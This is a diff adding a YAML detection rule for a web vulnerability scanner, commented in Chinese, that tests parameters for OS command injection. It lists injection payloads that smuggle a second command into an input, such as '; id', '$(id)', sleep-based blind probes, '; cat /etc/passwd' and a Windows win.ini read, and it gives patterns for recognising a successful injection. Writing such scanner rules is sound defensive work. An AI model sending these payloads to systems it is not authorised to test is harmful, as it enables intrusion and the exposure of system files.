@@ -1,0 +1,67 @@
+# Command Injection 检测规则
+name: command_injection
+description: Command Injection — 操作系统命令注入
+severity: critical
+owasp: "A03:2021 — Injection"
+confidence: 0.9
+enabled: true
+
+endpoint_filter:
+  methods: [GET, POST, PUT]
+  param_types: [query, body]
+
+payloads:
+  # Unix/Linux 命令注入
+  - value: "; id"
+    description: "分号 + id 命令"
+  - value: "| id"
+    description: "管道 + id"
+  - value: "`id`"
+    description: "反引号命令执行"
+  - value: "$(id)"
+    description: "美元括号命令执行"
+  - value: "&& id"
+    description: "AND + id"
+  - value: "|| id"
+    description: "OR + id"
+  # 盲注探测
+  - value: "; sleep 5"
+    description: "sleep 盲注探测"
+  - value: "| sleep 5"
+    description: "管道 + sleep"
+  - value: "`sleep 5`"
+    description: "反引号 + sleep"
+  # 信息泄露
+  - value: "; cat /etc/passwd"
+    description: "直接读取密码文件"
+  - value: "; whoami"
+    description: "当前用户探测"
+  - value: "; uname -a"
+    description: "系统信息探测"
+  - value: "; pwd"
+    description: "当前目录探测"
+  # Windows 命令注入
+  - value: "& whoami"
+    description: "Windows whoami"
+  - value: "& type %SYSTEMROOT%\\win.ini"
+    description: "Windows 文件读取"
+  - value: "& ping -n 5 127.0.0.1"
+    description: "ping 盲注 (Windows)"
+  # 编码绕过
+  - value: "%0Aid"
+    description: "换行符注入"
+  - value: "%0D%0Aid"
+    description: "CRLF 注入"
+
+exploit_indicator:
+  patterns:
+    - "uid=\\d+\\(.*\\) gid=\\d+"
+    - "root:.*:0:0:"
+    - "\\[font"
+    - "for 16-bit app support"
+    - "Linux|Darwin|Windows"
+    - "x86_64|i386|amd64"
+  status_codes: [200]
+
+expected_normal: "应用程序不应将用户输入传递给系统命令执行"
+reasoning_template: "对 {param_name} 参数进行命令注入测试，Payload: {payload_value}"
